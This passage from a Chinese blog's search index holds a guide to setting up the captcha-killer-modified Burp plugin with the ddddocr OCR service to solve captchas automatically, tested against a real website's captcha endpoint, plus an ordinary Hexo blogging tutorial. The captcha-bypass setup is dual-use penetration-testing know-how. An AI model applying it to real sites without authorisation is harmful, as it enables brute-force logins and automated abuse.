        <content type="html"><![CDATA[<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/releases/">Releases · f0ng&#x2F;captcha-killer-modified</a></li></ul><p>​最新版的Burp插件（根据自己的jdk版本来选择）</p><img src="/img/202211021704736.png" alt="image-20221102155830776" style="zoom:50%;" /><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/tree/0.16">f0ng&#x2F;captcha-killer-modified at 0.16</a></li></ul><p>​把<code>codereg.py</code>给down下来（你可以选择直接下zip包，或者直接复制）</p><img src="/img/202211021704971.png" alt="image-20221102160044024" style="zoom:50%;" /><ul><li>安装ddddocr所需要的python库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ddddocr aiohttp</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Burp安装插件</p><p><img src="/img/202211021704397.png" alt="image-20221102160634476"></p><h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="测试接口"><a href="#测试接口" class="headerlink" title="测试接口"></a>测试接口</h2><p>1、首先得找个验证码接口，不然咋测试？</p><p>​我这里随便上网找了个网站的<a href="http://passport.youmi.cn/include/showcaptcha/?w=62&h=24&s=12&x=0.7366157956335038&mobile=">验证码接口</a></p><p>​你可以自己找，也可以直接用我上面找的那个</p><p>2、访问上面的接口，bp抓包，发送到repeater模块（因为没有找到可以直接发到captcha-killer模块的选项）</p><img src="/img/202211021705301.png" alt="image-20221102164204151" style="zoom:50%;" /><p>3、发送到captcha-killer</p><p>​选send to captcha panel哈！！</p><p>​下面的interface panel是识别模块用的（这里也就是ddddocr）</p><img src="/img/202211021705424.png" alt="image-20221102164341238" style="zoom:50%;" /><p>4、点击【获取】，看后面的验证码也没有变化，有变化的话，测试接口这一部分就没问题啦</p><img src="/img/202211021705259.png" alt="image-20221102164611408" style="zoom:50%;" /><p>接下来就开始配置ddddocr模块去识别</p><h2 id="ddddocr配置"><a href="#ddddocr配置" class="headerlink" title="ddddocr配置"></a>ddddocr配置</h2><p>刚刚下的<code>codereg.py</code>还记得么？pip包装好了就可以开始下面的步骤了。</p><p>1、用你的python3去运行它</p><p>​因为我电脑有两个版本的python，环境变量区分了python2和python3，你可以根据你自己电脑的配置来运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 codereg.py</span><br></pre></td></tr></table></figure><p>确定该服务已经起来了</p><p><img src="/img/202211021705519.png" alt="image-20221102165131315"></p><p>2、配置interface</p><p>​我换了4130端口，你那边填多少端口以你上面跑python脚本的时候输出的端口</p><img src="/img/202211021705686.png" alt="image-20221102165229831" style="zoom:50%;" /><p>request的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:4130</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@img_RAW&gt;&lt;@img_RAW&gt;&lt;@BASE64&gt;</span><br></pre></td></tr></table></figure><p>激动人心的时候到啦！</p><p>3、点【识别】</p><img src="/img/202211021705281.png" alt="image-20221102165526579" style="zoom:50%;" /><p>欸~~这就可以啦</p><p>匹配方式选择Response data就好</p><p>如果返回 <strong>空白</strong>或者<strong>403Forbidden</strong>，参考以下方法</p><h1 id="返回空白"><a href="#返回空白" class="headerlink" title="返回空白"></a>返回空白</h1><p>接口的request填错了会这样，我遇到过，直接复制上面的模板就好</p><h1 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h1><p>打开<code>codereg.py</code></p><p>把下面这两句引起403报错的语句注释掉就好</p><img src="/img/202211021705894.png" alt="image-20221102165756410" style="zoom:50%;" /><p>接着Ctrl+C停止之前的脚本，重新运行一遍脚本，就可以啦</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo简明教程</title>
      <link href="/hexo-tutorial/"/>
      <url>/hexo-tutorial/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h1><p>Hexo 是一个基于 node.js 快速、简洁且高效的博客框架。支持 Markdown 写作，可一键部署到 <a href="https://github.com/">GitHub</a>平台。Hexo 还有丰富的主题和插件可供定制和扩展，可以瞬间拥有个人专属的博客网站。</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><blockquote><p>本篇博客不提供安装教程（emmmm就是我太懒了），请自行搜索</p></blockquote><ul><li><p>node.js（不低于10.13，建议使用12.0及以上版本）</p><p>Hexo基于node.js</p></li><li><p>npm</p><p>node.js的包管理工具</p></li></ul><p>查看电脑是否安装了环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看node.js版本</span></span><br><span class="line">node <span class="literal">-v</span></span><br><span class="line"><span class="comment"># 查看npm版本</span></span><br><span class="line">npm <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p>有版本输出就代表环境安装好了</p><p>那我们就正式开始Hexo之路吧~</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure><p>-g 代表全局安装（不必太过纠结这个哈~熟悉前端和node的朋友可以直接<code>npm install hexo-cli</code>）</p><p>好啦！到这里，Hexo已经安装好啦 ~</p><h1 id="Hexo操作"><a href="#Hexo操作" class="headerlink" title="Hexo操作"></a>Hexo操作</h1><p>下面是Hexo的一些操作指南，助你快速入门Hexo</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>这里讲两种方式哈，效果都一样，随便选个就行</p><p><strong>方法一</strong></p><ol><li>新建一个文件夹</li><li>cmd切换到该路径，输入<code>hexo init</code></li></ol><p><strong>方法二</strong></p><p><code>hexo init [name]</code></p><p>name是文件夹名字，相当于省去了方法一的第一步</p><h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>经过上一步的初始化操作，你的Hexo博客已经搭建起来啦</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="comment"># 生成</span></span><br><span class="line">hexo s <span class="comment"># 本地启动服务</span></span><br></pre></td></tr></table></figure><p>这时候，终端会开启一个服务，一般是<a href="http://localhost:4000/">http://localhost:4000</a>，按住Ctrl单击就可以打开</p><p>这时候你就可以看到一个Hexo博客啦~</p><p><em>如果无法显示，可能是 4000 端口被占用了，可以使用如下命令指定端口</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -p 4444 <span class="comment"># 指定4444端口或者其他端口</span></span><br></pre></td></tr></table></figure><p>如果经常4000端口被占用，建议一劳永逸，直接修改配置文件<em>node_modules&#x2F;hexo-server&#x2F;index.js</em>，将默认端口改成4444或者其他端口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">config</span>.<span class="property">server</span> = <span class="title function_">assign</span>(&#123;</span><br><span class="line">  <span class="comment">//将默认端口改成4444</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">4444</span>,</span><br><span class="line">  <span class="attr">log</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ip</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">compress</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">header</span>: <span class="literal">true</span></span><br><span class="line">&#125;, hexo.<span class="property">config</span>.<span class="property">server</span>);</span><br></pre></td></tr></table></figure><p>如果你的github也配置好了，那么输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d <span class="comment"># 部署</span></span><br></pre></td></tr></table></figure><p>就可以把本地的博客部署到GitHub Pages上啦</p><h2 id="新建博客"><a href="#新建博客" class="headerlink" title="新建博客"></a>新建博客</h2><ol><li>新建一个文章</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br><span class="line"><span class="comment"># or 不使用简写</span></span><br><span class="line">hexo new <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br></pre></td></tr></table></figure><ol start="2"><li>打开博客目录下的&#x2F;source&#x2F;_posts就可以看到刚刚新建的md文件啦</li><li>编辑md文件，保存</li><li>生成并本地预览</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo s <span class="literal">-g</span> <span class="comment"># 组合命令，生成并本地预览</span></span><br><span class="line"><span class="comment"># or 分开输入两条命令</span></span><br><span class="line">hexo g<span class="comment"># 生成（缩写）</span></span><br><span class="line">hexo s<span class="comment"># 预览（缩写）</span></span><br><span class="line"><span class="comment"># or 分开并不使用简写</span></span><br><span class="line">hexo generate<span class="comment"># 生成</span></span><br><span class="line">hexo server <span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><h2 id="设置标头"><a href="#设置标头" class="headerlink" title="设置标头"></a>设置标头</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">我是文章名</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-08-13 09:22:18</span></span><br><span class="line"><span class="comment"># 标签</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line"><span class="comment"># 分类</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tutorial</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>在 _config.yml 开启资源文件夹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>开启之后，在 _posts 目录下会生成一个与文章同名的文件夹。把需要插入到文章中的图片放到该文件夹中，并在写文章时通过如下标签引用即可。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img &lt;图片名&gt; [图片标题] %&#125;</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>默认主题太丑了？那换个好看滴主题叭~~</p><p>直接去官网看看，找到喜欢的换就行，一般主题的开发者会写好怎么更换的哈~（emmm是我懒）</p><p>换好了之后，执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean<span class="comment"># 清除，避免更换失败</span></span><br><span class="line">hexo s <span class="literal">-g</span><span class="comment"># 生成，本地预览</span></span><br><span class="line"><span class="comment">## 预览没问题之后</span></span><br><span class="line">hexo d<span class="comment"># 部署</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
